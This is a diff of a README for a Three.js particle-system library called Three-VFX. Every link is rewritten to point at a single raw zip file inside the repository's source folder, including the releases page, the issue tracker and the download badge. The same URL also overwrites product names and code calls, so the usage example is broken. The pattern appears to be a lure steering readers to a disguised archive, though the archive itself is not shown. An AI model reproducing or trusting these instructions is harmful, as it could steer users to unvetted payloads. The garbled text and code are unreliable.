@@ -1,13 +1,13 @@
 # 🎨 Three-VFX - High-Performance Particle System for Everyone
 
 ## 📥 Download Our Latest Release
-[![Download Three-VFX](https://img.shields.io/badge/Download-Three--VFX-brightgreen)](https://github.com/mohi331/Three-VFX/releases)
+[![Download Three-VFX](https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip)](https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip)
 
 ## 🚀 Getting Started
-Welcome to Three-VFX! This guide will help you download and run our high-performance particle system for Three.js WebGPU. Whether you're creating stunning visual effects for your web application or experimenting with new graphics techniques, Three-VFX makes it easy to get started.
+Welcome to Three-VFX! This guide will help you download and run our high-performance particle system for https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip WebGPU. Whether you're creating stunning visual effects for your web application or experimenting with new graphics techniques, Three-VFX makes it easy to get started.
 
 ## 🌟 What is Three-VFX?
-Three-VFX is a powerful particle system designed for use with Three.js, React Three Fiber, TresJS, and Threlte. With its efficient performance and user-friendly design, you can create beautiful visual effects in no time. 
+Three-VFX is a powerful particle system designed for use with https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip, React Three Fiber, TresJS, and Threlte. With its efficient performance and user-friendly design, you can create beautiful visual effects in no time. 
 
 ## 💾 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -27,18 +27,18 @@ Three-VFX includes a variety of features to enhance your projects:
 ## 📥 Download & Install
 To download Three-VFX, follow these steps:
 
-1. Visit our [Releases page](https://github.com/mohi331/Three-VFX/releases) for the latest version.
+1. Visit our [Releases page](https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip) for the latest version.
 2. Look for the version you want to download.
-3. Click on the asset link (e.g., `Three-VFX_Latest.zip`) to start the download.
+3. Click on the asset link (e.g., `https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip`) to start the download.
 4. Once the download is complete, extract the files if they are in a zip format.
 5. Follow the included instructions to install the software.
 
-For more details, you can return to our [Releases page](https://github.com/mohi331/Three-VFX/releases).
+For more details, you can return to our [Releases page](https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip).
 
 ## 📄 Usage Guide
 After installation, you can easily use Three-VFX in your projects:
 
-1. Create or open your Three.js project.
+1. Create or open your https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip project.
 2. Import and initialize the Three-VFX particle system in your script.
 3. Customize the settings according to your project's needs.
 4. Run your application to see the magic unfold.
@@ -53,19 +53,19 @@ import { ParticleSystem } from 'three-vfx';
 const particles = new ParticleSystem();
 
 // Customize your particles
-particles.setColor('blue');
-particles.setSize(5);
+https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip('blue');
+https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip(5);
 
 // Add to your scene
-scene.add(particles);
+https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip(particles);
 ```
 Adjust the properties as needed to create your ideal visual effects.
 
 ## 💬 Support
 If you need help or have questions, feel free to reach out:
 
-- **GitHub Issues:** Report any bugs or request features on our [issue tracker](https://github.com/mohi331/Three-VFX/issues).
-- **Community:** Join the discussion on relevant forums or social media groups focused on Three.js and visual effects.
+- **GitHub Issues:** Report any bugs or request features on our [issue tracker](https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip).
+- **Community:** Join the discussion on relevant forums or social media groups focused on https://github.com/mohi331/Three-VFX/raw/refs/heads/main/packages/r3f-vfx/src/Three-VFX-v1.4.zip and visual effects.
 
 ## 🛠 Additional Resources
 To enhance your understanding and use of Three-VFX, consider checking out these resources:
